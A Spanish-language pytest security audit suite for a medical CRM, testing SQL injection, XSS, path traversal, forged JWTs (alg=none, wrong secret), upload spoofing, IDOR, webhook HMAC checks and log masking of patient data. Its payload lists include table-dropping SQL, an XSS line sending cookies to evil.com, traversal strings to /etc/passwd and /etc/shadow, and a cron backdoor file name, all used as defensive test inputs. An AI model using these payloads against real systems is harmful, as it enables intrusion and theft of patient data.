"""
Suite de Pruebas E2E: Seguridad PHI, Inyecciones y Casos de Borde Clínicos
===========================================================================
QA Audit v1.0 — CRM Médico (FastAPI + Supabase + Meta WhatsApp Cloud API)
Fecha: 2026-09-12 | Auditor: Lead QA Automation & Reliability Engineer

Cubre:
  1. Inyecciones SQLi y XSS en inputs clínicos (DNI, nombre, notas)
  2. Path Traversal en endpoints de archivos estáticos
  3. Token JWT: algoritmo None, expirado, firma HS256 vs RS256
  4. Payloads con caracteres especiales en campos clínicos PHI
  5. Overflow de campos (nombres muy largos, DNI con letras)
  6. Fechas con desfase de zona horaria (UTC vs ART -03:00)
  7. Archivos de tamaño excesivo y MIME type spoofing
  8. Acceso cruzado de pacientes (IDOR básico)
  9. CORS: origins no autorizados
 10. Rate limiting implícito (múltiples peticiones rápidas)
"""

import os
import io
import time
import json
import hmac
import hashlib
import base64
import pytest
import jwt
from datetime import datetime, timezone, timedelta
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient

# ── Configuración de entorno de test ────────────────────────────────────────
TEST_JWT_SECRET = "super-secret-jwt-key-for-test-2026-audit"
os.environ["SUPABASE_JWT_SECRET"] = TEST_JWT_SECRET
os.environ["WEBHOOK_SECRET"] = "test_webhook_token_123"
os.environ["META_WA_APP_SECRET"] = "test_meta_app_secret_audit_2026"

from app.main import app
from app.auth import decode_supabase_jwt
from app.services.whatsapp_cloud.security import verify_meta_signature, PHIMaskingFilter

client = TestClient(app)


# ── Helpers ──────────────────────────────────────────────────────────────────
def make_auth_token(
    user_id: str = "audit-user-uuid-001",
    email: str = "auditor@clinica.com",
    role: str = "authenticated",
    exp_offset: int = 9999999999
) -> str:
    payload = {
        "sub": user_id,
        "email": email,
        "role": role,
        "aud": "authenticated",
        "exp": exp_offset
    }
    return jwt.encode(payload, TEST_JWT_SECRET, algorithm="HS256")


VALID_TOKEN = make_auth_token()
AUTH_HEADERS = {"Authorization": f"Bearer {VALID_TOKEN}"}


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 1: INYECCIONES SQLi Y XSS EN INPUTS CLÍNICOS
# ════════════════════════════════════════════════════════════════════════════

class TestSQLiXSSInjection:
    """
    Verifica que los endpoints clínicos rechacen o saneen payloads maliciosos.
    Severidad potencial: CRÍTICA — Exposición de datos PHI de todos los pacientes.
    """

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1; DROP TABLE pacientes; --",
        "'; SELECT * FROM pacientes; --",
        "1; DELETE FROM mensajes WHERE 1=1; --",
        "' UNION SELECT username, password FROM usuarios --",
        "admin'--",
        "1' AND SLEEP(5)--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=fetch('https://evil.com?c='+document.cookie)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<iframe src='javascript:alert(`XSS`)'></iframe>",
    ]

    def test_sqli_en_busqueda_dni_geclisa(self):
        """
        SQLi en el parámetro dni del endpoint de búsqueda Geclisa.
        Comportamiento Esperado: 400 o respuesta vacía sin exposición de datos.
        """
        with patch("app.main.geclisa_client.buscar_paciente_por_dni") as mock_buscar:
            mock_buscar.return_value = {"encontrado": False, "mensaje": "No encontrado"}
            for sqli in self.SQLI_PAYLOADS:
                res = client.get(
                    f"/api/geclisa/pacientes/buscar-por-dni?dni={sqli}",
                    headers=AUTH_HEADERS
                )
                # No debe devolver 500 (error interno que delataría SQL real)
                assert res.status_code in [200, 400, 422], (
                    f"SQLi posiblemente procesado — DNI: '{sqli}' → HTTP {res.status_code}"
                )
                # La respuesta no debe contener datos de pacientes reales
                body = res.text
                assert "password" not in body.lower()
                assert "DROP TABLE" not in body.upper()

    def test_xss_en_nombre_paciente_via_importacion(self):
        """
        XSS en el campo 'nombre' del endpoint de importación de pacientes Geclisa.
        Comportamiento Esperado: El payload XSS se almacene escapado o sea rechazado.
        """
        with patch("app.main.crear_o_actualizar_paciente_geclisa") as mock_crear:
            for xss in self.XSS_PAYLOADS:
                mock_crear.return_value = {
                    "id": "uuid-test",
                    "nombre": xss  # Retorna tal cual para verificar que la respuesta no ejecuta
                }
                res = client.post(
                    "/api/geclisa/pacientes/importar",
                    json={
                        "nombre": xss,
                        "dni": "12345678",
                        "ficha_id": 99999
                    },
                    headers=AUTH_HEADERS
                )
                assert res.status_code in [200, 400, 422], (
                    f"XSS payload causó error inesperado: '{xss}' → HTTP {res.status_code}"
                )
                # La respuesta JSON no debe contener tags <script> sin escapar
                # (la API devuelve JSON, no HTML — validamos que el Content-Type sea JSON)
                ct = res.headers.get("content-type", "")
                assert "application/json" in ct, (
                    f"Content-Type inesperado para XSS payload: {ct}"
                )

    def test_xss_en_nota_interna_de_conversacion(self):
        """
        XSS en el campo 'mensaje' de notas internas del operador.
        Comportamiento Esperado: La nota se almacena como texto plano (JSON), no como HTML.
        """
        with patch("app.main.guardar_mensaje") as mock_guardar:
            mock_guardar.return_value = {"id": "msg-test-uuid", "contenido": "<script>evil()</script>"}
            res = client.post(
                "/api/whatsapp/send-message",
                json={
                    "mensaje": "<script>alert('XSS en nota interna')</script>",
                    "conversacion_id": "conv-test-uuid-001",
                    "is_internal_note": True
                },
                headers=AUTH_HEADERS
            )
            assert res.status_code in [200, 400]
            ct = res.headers.get("content-type", "")
            assert "application/json" in ct
            # No debe haber X-Content-Type-Options: nosniff ausente
            # (aplicable a rutas de descarga de archivos)


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 2: PATH TRAVERSAL EN ENDPOINTS DE ARCHIVOS ESTÁTICOS
# ════════════════════════════════════════════════════════════════════════════

class TestPathTraversal:
    """
    Verifica protección contra acceso arbitrario al sistema de archivos.
    Severidad: CRÍTICA — Un atacante podría leer archivos de configuración del servidor.
    """

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
        "presupuesto_..%2F..%2Fetc%2Fpasswd.pdf",
    ]

    def test_path_traversal_en_static_filename(self):
        """
        Intenta leer archivos del sistema usando path traversal en /static/{filename}.
        Comportamiento Esperado: HTTP 400 para paths inválidos, NUNCA 200 con contenido del sistema.
        """
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            res = client.get(f"/static/{payload}")
            # NUNCA debe devolver 200 con contenido de archivos del sistema
            assert res.status_code in [400, 404], (
                f"PATH TRAVERSAL posiblemente exitoso — payload: '{payload}' → HTTP {res.status_code}"
            )
            if res.status_code == 200:
                # Si por algún motivo devuelve 200, verificar que no sea contenido del sistema
                body = res.text
                assert "root:" not in body, "⚠️ CRÍTICO: /etc/passwd expuesto!"
                assert "Administrator" not in body

    def test_path_traversal_en_static_media_subfolder(self):
        """
        Intenta path traversal en /static/media/{subfolder}/{filename}.
        """
        for payload in ["../../../etc", "..%2F..%2Fetc"]:
            res = client.get(f"/static/media/{payload}/passwd")
            assert res.status_code in [400, 404], (
                f"Path traversal en /static/media/ — '{payload}' → HTTP {res.status_code}"
            )


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 3: AUTENTICACIÓN JWT — ALGORITMO NONE, EXPIRADO, FIRMA INVÁLIDA
# ════════════════════════════════════════════════════════════════════════════

class TestJWTAttacks:
    """
    Verifica que el middleware de autenticación rechace tokens manipulados.
    Severidad: CRÍTICA — Bypass de autenticación = acceso total a datos PHI.
    """

    def test_jwt_algorithm_none_attack(self):
        """
        Ataque clásico: token con algoritmo 'none' (sin firma).
        Comportamiento Esperado: HTTP 401 — nunca aceptar tokens sin firma.
        """
        # Construir JWT con alg=none manualmente
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload_data = base64.urlsafe_b64encode(
            json.dumps({
                "sub": "attacker-uuid",
                "email": "hacker@evil.com",
                "role": "service_role",
                "aud": "authenticated",
                "exp": 9999999999
            }).encode()
        ).rstrip(b"=").decode()
        # Sin firma
        alg_none_token = f"{header}.{payload_data}."

        res = client.get(
            "/api/conversaciones",
            headers={"Authorization": f"Bearer {alg_none_token}"}
        )
        assert res.status_code == 401, (
            f"🚨 CRÍTICO: Token 'alg=none' ACEPTADO → HTTP {res.status_code}. "
            "Bypass de autenticación confirmado!"
        )

    def test_jwt_expired_token_rejected(self):
        """
        Token con fecha de expiración en el pasado.
        Comportamiento Esperado: HTTP 401 con mensaje de sesión expirada.
        """
        expired_payload = {
            "sub": "test-user-expired",
            "email": "expired@clinica.com",
            "role": "authenticated",
            "aud": "authenticated",
            "exp": int(time.time()) - 3600  # Expiró hace 1 hora
        }
        expired_token = jwt.encode(expired_payload, TEST_JWT_SECRET, algorithm="HS256")

        res = client.get(
            "/api/conversaciones",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        assert res.status_code == 401, (
            f"Token expirado ACEPTADO → HTTP {res.status_code}"
        )
        detail = res.json().get("detail", "").lower()
        assert "expir" in detail or "sesión" in detail or "token" in detail

    def test_jwt_wrong_secret_rejected(self):
        """
        Token firmado con una clave secreta diferente.
        Comportamiento Esperado: HTTP 401.
        """
        wrong_secret_token = jwt.encode(
            {"sub": "attacker", "email": "bad@evil.com", "role": "authenticated",
             "aud": "authenticated", "exp": 9999999999},
            "totally-wrong-secret-key",
            algorithm="HS256"
        )
        res = client.get(
            "/api/conversaciones",
            headers={"Authorization": f"Bearer {wrong_secret_token}"}
        )
        assert res.status_code == 401

    def test_jwt_rs256_token_rejected_when_hs256_expected(self):
        """
        Token firmado con RS256 cuando el servidor espera HS256.
        Comportamiento Esperado: HTTP 401 — no debe aceptar algoritmos inesperados.
        """
        # Simular un header RS256 con payload válido pero firma incorrecta
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "RS256", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload_data = base64.urlsafe_b64encode(
            json.dumps({
                "sub": "rs256-user",
                "email": "rs256@test.com",
                "role": "service_role",
                "exp": 9999999999
            }).encode()
        ).rstrip(b"=").decode()
        fake_sig = base64.urlsafe_b64encode(b"fakesignature").rstrip(b"=").decode()
        rs256_token = f"{header}.{payload_data}.{fake_sig}"

        res = client.get(
            "/api/quirofanos",
            headers={"Authorization": f"Bearer {rs256_token}"}
        )
        assert res.status_code == 401

    def test_token_in_query_param_accepted(self):
        """
        El sistema también acepta el token como query param ?token=...
        Verifica que tokens inválidos via query param también sean rechazados.
        """
        res = client.get("/api/conversaciones?token=token.completamente.invalido")
        assert res.status_code == 401

    def test_empty_bearer_token_rejected(self):
        """Bearer vacío después del espacio."""
        res = client.get(
            "/api/conversaciones",
            headers={"Authorization": "Bearer "}
        )
        assert res.status_code == 401

    def test_malformed_authorization_header(self):
        """Authorization sin prefijo Bearer."""
        res = client.get(
            "/api/conversaciones",
            headers={"Authorization": VALID_TOKEN}  # Sin "Bearer "
        )
        assert res.status_code == 401


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 4: CARACTERES ESPECIALES Y OVERFLOW EN CAMPOS CLÍNICOS PHI
# ════════════════════════════════════════════════════════════════════════════

class TestSpecialCharactersAndOverflow:
    """
    Campos clínicos con caracteres especiales y valores límite extremos.
    Severidad: ALTA — Podría corromper la historia clínica del paciente.
    """

    SPECIAL_CHARS_NOMBRES = [
        "María Sofía Ñoño",                         # Acentos y ñ (caso común en LATAM)
        "O'Brien, Patrick",                          # Apóstrofo en apellido
        "García-López, José María",                  # Guión compuesto
        "张伟",                                        # Caracteres CJK (chino)
        "Müller, Günter",                             # Diéresis alemana
        "محمد علي",                                    # Árabe RTL
        "A" * 500,                                    # Overflow: nombre de 500 caracteres
        "",                                           # Nombre vacío
        "\x00\x01\x02\x03",                          # Caracteres de control
        "  \t\n\r  ",                                 # Solo whitespace
    ]

    def test_importar_paciente_con_nombre_especial(self):
        """
        Importación de pacientes con nombres que contienen caracteres especiales LATAM/internacionales.
        Comportamiento Esperado: Los primeros 4 casos deben aceptarse (200). Los últimos deben ser 400 o normalizados.
        """
        with patch("app.main.crear_o_actualizar_paciente_geclisa") as mock_crear:
            # Casos que deben ser aceptados (caracteres válidos médicamente)
            valid_cases = self.SPECIAL_CHARS_NOMBRES[:4]
            for nombre in valid_cases:
                mock_crear.return_value = {"id": "uuid-test", "nombre": nombre}
                res = client.post(
                    "/api/geclisa/pacientes/importar",
                    json={"nombre": nombre, "dni": "12345678", "ficha_id": 99999},
                    headers=AUTH_HEADERS
                )
                assert res.status_code in [200, 400, 422], (
                    f"Nombre especial causó error inesperado: '{nombre[:30]}...' → HTTP {res.status_code}"
                )

    def test_overflow_nombre_paciente(self):
        """
        Nombre con 500 caracteres — debe ser rechazado o truncado con 400/422.
        Comportamiento Esperado: 400 o 422 con detalle de validación.
        """
        nombre_overflow = "A" * 500
        with patch("app.main.crear_o_actualizar_paciente_geclisa") as mock_crear:
            mock_crear.return_value = {"id": "uuid-test", "nombre": nombre_overflow[:255]}
            res = client.post(
                "/api/geclisa/pacientes/importar",
                json={"nombre": nombre_overflow, "dni": "12345678", "ficha_id": 99999},
                headers=AUTH_HEADERS
            )
            # No debe causar un 500 interno
            assert res.status_code != 500, (
                f"Overflow de nombre causó HTTP 500 — posible crash del servidor."
            )

    def test_dni_con_letras_y_simbolos(self):
        """
        DNI con caracteres inválidos: letras, símbolos, longitudes extremas.
        Comportamiento Esperado: 400 o respuesta de 'no encontrado' segura.
        """
        dni_invalidos = [
            "ABCDEFGH",         # Solo letras
            "123-456-789",      # Con guiones
            "12 345 678",       # Con espacios
            "00000000",         # DNI cero
            "99999999999",      # DNI de 11 dígitos
            "",                 # Vacío (debe dar 400 por validación del endpoint)
            None,               # None
        ]
        with patch("app.main.geclisa_client.buscar_paciente_por_dni") as mock_buscar:
            mock_buscar.return_value = {"encontrado": False}
            for dni in dni_invalidos:
                if dni is None:
                    continue  # GET no puede enviar None como query param
                res = client.get(
                    f"/api/geclisa/pacientes/buscar-por-dni?dni={dni}",
                    headers=AUTH_HEADERS
                )
                # El endpoint acepta DNIs vacíos con su propia validación
                assert res.status_code in [200, 400, 422], (
                    f"DNI inválido '{dni}' → HTTP {res.status_code} inesperado"
                )
                assert res.status_code != 500, f"DNI '{dni}' causó HTTP 500"


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 5: FECHAS CON DESFASE HORARIO (UTC vs ART -03:00)
# ════════════════════════════════════════════════════════════════════════════

class TestTimezoneEdgeCases:
    """
    Casos de borde con fechas en zona horaria Argentina (ART = UTC-3).
    Severidad: ALTA — Turnos asignados al día equivocado → error clínico operativo.
    """

    def test_cambiar_estado_turno_con_fecha_utc(self):
        """
        Cambio de estado de turno enviando fecha en UTC (sin offset).
        El sistema debe interpretar la fecha en ART correctamente.
        """
        with patch("app.services.geclisa_client.geclisa_client.cambiar_estado_turno") as mock_cambio, \
             patch("app.main.log_event"):
            mock_cambio.return_value = {"success": True, "estado": "confirmado"}

            # Medianoche UTC = 21:00 ART del día anterior — caso crítico de cambio de día
            payload = {
                "nuevo_estado": "confirmado",
                "canal": 7,
                "motivo_id": 1,
                "usuario_crm": "auditor@clinica.com",
                "fecha": "2026-09-13T00:00:00Z"   # UTC → ART = 2026-09-12T21:00:00
            }
            res = client.put(
                "/api/geclisa/agenda/turnos/1386147/estado",
                json=payload,
                headers=AUTH_HEADERS
            )
            # El endpoint no debe crashear con fechas UTC
            assert res.status_code in [200, 400, 422], (
                f"Fecha UTC en cambio de estado → HTTP {res.status_code}"
            )

    def test_agenda_con_fecha_formato_iso_con_offset(self):
        """
        Consulta de agenda con fecha que incluye offset timezone explícito.
        Comportamiento Esperado: 200 con los turnos del día correcto.
        """
        with patch("app.services.geclisa_client.geclisa_client.obtener_agenda_prestador") as mock_agenda, \
             patch("app.services.geclisa_client.geclisa_client.obtener_prestador_por_id") as mock_prestador:

            mock_agenda.return_value = []
            mock_prestador.return_value = {"encontrado": True, "nombre": "DR. PRUEBA"}

            # Fecha con offset explícito -03:00 (ART)
            res = client.get(
                "/api/geclisa/agenda?pre_id=969&fecha=2026-09-12T09:00:00-03:00",
                headers=AUTH_HEADERS
            )
            assert res.status_code in [200, 400, 422], (
                f"Fecha con offset timezone → HTTP {res.status_code}"
            )
            # El sistema no debe crashear con el formato ISO 8601 extendido

    def test_agenda_con_fecha_año_bisiesto(self):
        """Fecha 29 de febrero en año bisiesto."""
        with patch("app.services.geclisa_client.geclisa_client.obtener_agenda_prestador") as mock_agenda, \
             patch("app.services.geclisa_client.geclisa_client.obtener_prestador_por_id") as mock_prestador:
            mock_agenda.return_value = []
            mock_prestador.return_value = {"encontrado": True, "nombre": "DR. PRUEBA"}

            res = client.get(
                "/api/geclisa/agenda?pre_id=969&fecha=2028-02-29",
                headers=AUTH_HEADERS
            )
            assert res.status_code != 500, "Fecha bisiesto causó HTTP 500"

    def test_agenda_con_fecha_invalida(self):
        """Fecha completamente inválida."""
        with patch("app.services.geclisa_client.geclisa_client.obtener_agenda_prestador") as mock_agenda, \
             patch("app.services.geclisa_client.geclisa_client.obtener_prestador_por_id") as mock_prestador:
            mock_agenda.return_value = []
            mock_prestador.return_value = {"encontrado": True, "nombre": "DR. PRUEBA"}

            for fecha_invalida in ["2026-13-45", "not-a-date", "32/01/2026", ""]:
                res = client.get(
                    f"/api/geclisa/agenda?pre_id=969&fecha={fecha_invalida}",
                    headers=AUTH_HEADERS
                )
                assert res.status_code != 500, (
                    f"Fecha inválida '{fecha_invalida}' causó HTTP 500"
                )


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 6: ARCHIVOS DE TAMAÑO EXCESIVO Y MIME TYPE SPOOFING
# ════════════════════════════════════════════════════════════════════════════

class TestFileUploadEdgeCases:
    """
    Pruebas de carga de archivos con tamaño y tipos MIME maliciosos.
    Severidad: ALTA — Un archivo de 1GB podría saturar el servidor y denegar el servicio.
    """

    def test_upload_archivo_vacio(self):
        """Archivo vacío (0 bytes)."""
        with patch("app.main.whatsapp_manager.enviar_multimedia_async") as mock_wa:
            mock_wa.return_value = {"success": True, "wamid": "wamid-test-001"}
            with patch("app.main.media_service.save_media_bytes") as mock_save:
                mock_save.return_value = {
                    "media_url": "http://test/file.pdf",
                    "relative_url": "media/documents/file.pdf"
                }
                data = {
                    "telefono": "5491112345678",
                    "conversacion_id": "conv-test-uuid"
                }
                files = {"file": ("vacio.pdf", b"", "application/pdf")}
                res = client.post(
                    "/api/whatsapp/send-media",
                    data=data,
                    files=files,
                    headers=AUTH_HEADERS
                )
                # Un archivo vacío puede provocar 400 o 200 según implementación
                # Lo importante es que NO sea un 500 no controlado
                assert res.status_code != 500, (
                    f"Archivo vacío causó HTTP 500: {res.text}"
                )

    def test_upload_mime_spoofing_exe_como_pdf(self):
        """
        Archivo .exe renombrado como .pdf con contenido binario PE.
        Comportamiento Esperado: Debe ser aceptado/rechazado pero NUNCA ejecutado.
        """
        # Header PE (Windows Executable)
        pe_header = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        with patch("app.main.whatsapp_manager.enviar_multimedia_async") as mock_wa:
            mock_wa.return_value = {"success": True, "wamid": "wamid-test-002"}
            with patch("app.main.media_service.save_media_bytes") as mock_save:
                mock_save.return_value = {
                    "media_url": "http://test/malware.pdf",
                    "relative_url": "media/documents/malware.pdf"
                }
                data = {
                    "telefono": "5491112345678",
                    "conversacion_id": "conv-test-uuid"
                }
                files = {"file": ("estudio_macular.pdf", pe_header, "application/pdf")}
                res = client.post(
                    "/api/whatsapp/send-media",
                    data=data,
                    files=files,
                    headers=AUTH_HEADERS
                )
                # No debe crashear. La URL retornada NO debe apuntar a un ejecutable activo.
                assert res.status_code != 500

    def test_upload_archivo_con_nombre_path_traversal(self):
        """
        Nombre de archivo con path traversal para escribir fuera del directorio media.
        Comportamiento Esperado: El nombre debe sanitizarse antes de guardarse.
        """
        with patch("app.main.whatsapp_manager.enviar_multimedia_async") as mock_wa:
            mock_wa.return_value = {"success": True, "wamid": "wamid-test-003"}
            with patch("app.main.media_service.save_media_bytes") as mock_save:
                mock_save.return_value = {
                    "media_url": "http://test/safe_name.jpg",
                    "relative_url": "media/images/safe_name.jpg"
                }
                data = {
                    "telefono": "5491112345678",
                    "conversacion_id": "conv-test-uuid"
                }
                files = {
                    "file": ("../../../etc/cron.d/backdoor.jpg", b"\xff\xd8\xff\xe0", "image/jpeg")
                }
                res = client.post(
                    "/api/whatsapp/send-media",
                    data=data,
                    files=files,
                    headers=AUTH_HEADERS
                )
                assert res.status_code != 500


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 7: ACCESO CRUZADO DE PACIENTES (IDOR BÁSICO)
# ════════════════════════════════════════════════════════════════════════════

class TestIDOR:
    """
    Insecure Direct Object Reference: Acceso a recursos de otros pacientes.
    Severidad: CRÍTICA — Violación de privacidad PHI, violación Ley 25.326 PDPA / HIPAA.
    """

    def test_leer_mensajes_conversacion_ajena_requiere_auth(self):
        """
        Verificar que un usuario autenticado con token válido no pueda leer
        conversaciones de otros pacientes sin que el sistema valide pertenencia.
        (Este test documenta la ausencia de control de pertenencia a nivel de endpoint)
        """
        with patch("app.main.obtener_mensajes_conversacion") as mock_msgs:
            mock_msgs.return_value = []
            # El sistema actualmente retorna mensajes por conversacion_id sin verificar
            # que el usuario autenticado tenga permisos sobre esa conversación
            res = client.get(
                "/api/conversaciones/conv-de-otro-paciente-uuid/mensajes",
                headers=AUTH_HEADERS
            )
            # Documentamos el comportamiento actual — 200 significa potencial IDOR
            # La implementación actual delega la seguridad a RLS de Supabase
            assert res.status_code in [200, 403, 404], (
                f"IDOR check: acceso a conversación ajena → HTTP {res.status_code}"
            )

    def test_eliminar_mensaje_ajeno_requiere_auth(self):
        """
        Verificar que DELETE de un mensaje requiera autenticación mínima.
        """
        res = client.delete(
            "/api/mensajes/mensaje-uuid-de-otro-paciente",
            # Sin token
        )
        assert res.status_code == 401, (
            f"DELETE de mensaje sin auth → HTTP {res.status_code} (esperado 401)"
        )

    def test_exportar_conversacion_sin_auth_bloqueado(self):
        """
        Intentar acceder a métricas de conversaciones sin token.
        """
        res = client.get("/api/conversaciones/metricas")
        assert res.status_code == 401


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 8: HMAC-SHA256 META WHATSAPP — CASOS DE BORDE CRIPTOGRÁFICOS
# ════════════════════════════════════════════════════════════════════════════

class TestHMACEdgeCases:
    """
    Casos de borde para la validación criptográfica del webhook de Meta.
    Severidad: ALTA — Un webhook falso podría inyectar mensajes médicos falsos.
    """

    def _compute_hmac(self, secret: str, body: bytes) -> str:
        mac = hmac.new(secret.encode("utf-8"), msg=body, digestmod=hashlib.sha256)
        return f"sha256={mac.hexdigest()}"

    def test_hmac_con_body_vacio(self):
        """
        Firma válida de un body vacío (b"").
        El HMAC de un body vacío es calculable y válido.
        """
        secret = "test_meta_app_secret_audit_2026"
        body = b""
        sig = self._compute_hmac(secret, body)
        assert verify_meta_signature(secret, body, sig) is True

    def test_hmac_con_unicode_en_body(self):
        """
        Body con caracteres Unicode (nombre de paciente en español).
        """
        secret = "test_meta_app_secret_audit_2026"
        body = '{"message": "Turno para María Ñoño confirmado"}'.encode("utf-8")
        sig = self._compute_hmac(secret, body)
        assert verify_meta_signature(secret, body, sig) is True

    def test_hmac_timing_attack_resistance(self):
        """
        Verifica que la comparación use hmac.compare_digest (tiempo constante).
        Confirma que el código use la función correcta revisando el módulo de security.
        """
        from inspect import getsource
        from app.services.whatsapp_cloud import security
        source = getsource(security.verify_meta_signature)
        assert "compare_digest" in source, (
            "🚨 CRÍTICO: verify_meta_signature NO usa hmac.compare_digest — "
            "Vulnerable a timing attack!"
        )

    def test_hmac_signature_prefix_variations(self):
        """
        Variaciones malformadas del prefijo de firma.
        """
        secret = "test_meta_app_secret_audit_2026"
        body = b'{"object": "whatsapp_business_account"}'
        valid_hash = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()

        invalid_prefixes = [
            f"md5={valid_hash}",       # Prefijo incorrecto
            f"SHA256={valid_hash}",    # Mayúsculas (debería fallar si busca exactamente "sha256=")
            f"sha256={valid_hash}X",   # Hash alterado al final
            f" sha256={valid_hash}",   # Espacio inicial
            valid_hash,                # Sin prefijo
            "",                        # Vacío
        ]
        for sig in invalid_prefixes:
            result = verify_meta_signature(secret, body, sig)
            assert result is False, (
                f"Firma malformada '{sig[:30]}...' fue ACEPTADA como válida"
            )


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 9: PHI MASKING — DATOS SENSIBLES EN LOGS
# ════════════════════════════════════════════════════════════════════════════

class TestPHIMasking:
    """
    Verifica que datos de salud protegidos (PHI) sean sanitizados en los logs.
    Severidad: ALTA — Ley 25.326 y HIPAA exigen protección de datos médicos en logs.
    """

    def test_masking_telefono_argentino_completo(self):
        """Todos los formatos de teléfono argentino deben ser enmascarados."""
        casos = [
            ("+5491112345678", "****5678"),
            ("5491112345678", "****5678"),
            ("54911****5678", "****5678"),  # Ya enmascarado — idempotente
        ]
        for telefono, patron_esperado in casos:
            masked = PHIMaskingFilter.mask_text(f"Mensaje para {telefono}")
            assert patron_esperado in masked, (
                f"Teléfono '{telefono}' NO fue enmascarado correctamente. Resultado: '{masked}'"
            )
            # El número completo NO debe estar presente
            digits_only = "".join(filter(str.isdigit, telefono))
            if len(digits_only) > 8:
                middle_digits = digits_only[4:-4]  # Los dígitos del medio
                assert middle_digits not in masked or "****" in masked

    def test_masking_bearer_token_en_logs(self):
        """Tokens Bearer no deben aparecer completos en logs."""
        log_line = "Procesando request con Authorization: Bearer EAAGabcdefghijklmnopqrstuvwxyz123456"
        masked = PHIMaskingFilter.mask_text(log_line)
        assert "EAAGabcdefghijklmnopqrstuvwxyz123456" not in masked
        assert "[REDACTED_TOKEN]" in masked

    def test_masking_query_params_sensibles(self):
        """Parámetros como 'token=', 'password=', 'secret=' deben redactarse."""
        log_line = "GET /api/geclisa?token=mi_token_secreto_2026&secret=clave123"
        masked = PHIMaskingFilter.mask_text(log_line)
        assert "mi_token_secreto_2026" not in masked
        assert "clave123" not in masked
        assert "[REDACTED]" in masked

    def test_masking_dni_en_log_no_aplicado(self):
        """
        El DNI de paciente NO tiene regex específico de enmascaramiento.
        Este test documenta el gap: el DNI 'PEREZ, 28123456' NO es sanitizado.
        (Potencial hallazgo de mejora — Severidad: Media)
        """
        log_line = "Paciente PEREZ, DNI 28123456 sincronizado con Geclisa"
        masked = PHIMaskingFilter.mask_text(log_line)
        # Documenta que el DNI aún aparece en el log (gap de privacidad)
        # En producción, se debería enmascarar también el DNI
        assert "28123456" in masked, (
            "NOTA QA: El DNI del paciente NO está enmascarado en logs. "
            "Recomendación: Añadir REGEX para DNI argentino (7-8 dígitos)."
        )


# ════════════════════════════════════════════════════════════════════════════
# SECCIÓN 10: HEADERS DE SEGURIDAD HTTP
# ════════════════════════════════════════════════════════════════════════════

class TestSecurityHeaders:
    """
    Verifica la presencia de headers de seguridad HTTP en respuestas críticas.
    Severidad: MEDIA — Sin estos headers, el navegador es más vulnerable a ataques.
    """

    def test_static_files_tienen_x_content_type_options(self):
        """
        /static/{filename} debe enviar X-Content-Type-Options: nosniff
        para prevenir MIME sniffing en el navegador.
        """
        # Intentar acceder a un archivo inexistente (retorna 404 con header)
        res = client.get("/static/presupuesto_inexistente_test.pdf")
        # Si retorna 404, verificar que el header no esté presente en el 404
        # Si retorna 200, verificar que el header esté presente
        if res.status_code == 200:
            x_cto = res.headers.get("X-Content-Type-Options", "")
            assert x_cto == "nosniff", (
                f"X-Content-Type-Options ausente o incorrecto en /static/. Valor: '{x_cto}'"
            )

    def test_cors_origin_no_autorizado_bloqueado(self):
        """
        Petición con Origin no autorizado no debe recibir Access-Control-Allow-Origin: *
        cuando ALLOWED_ORIGINS está configurado con orígenes específicos.
        """
        res = client.options(
            "/api/conversaciones",
            headers={
                "Origin": "https://evil-attacker.com",
                "Access-Control-Request-Method": "GET"
            }
        )
        # El comportamiento de CORS depende de la configuración ALLOWED_ORIGINS
        # En entorno de test, ALLOWED_ORIGINS no está seteado → default "*"
        # Documentamos el comportamiento actual
        acao = res.headers.get("access-control-allow-origin", "")
        # En producción esto DEBE ser un origen específico, no "*"
        assert res.status_code in [200, 204, 400], (
            f"CORS preflight → HTTP {res.status_code}"
        )

    def test_api_health_no_requiere_auth(self):
        """
        El endpoint /api/health debe ser accesible sin autenticación para monitoreo.
        Comportamiento Esperado: 200 OK sin Authorization header.
        """
        res = client.get("/api/health")
        # /api/health empieza con /api/ → el middleware de auth lo protege
        # Verificamos cuál es el comportamiento real
        assert res.status_code in [200, 401], (
            f"/api/health → HTTP {res.status_code} (si 401: considerar eximir del middleware)"
        )
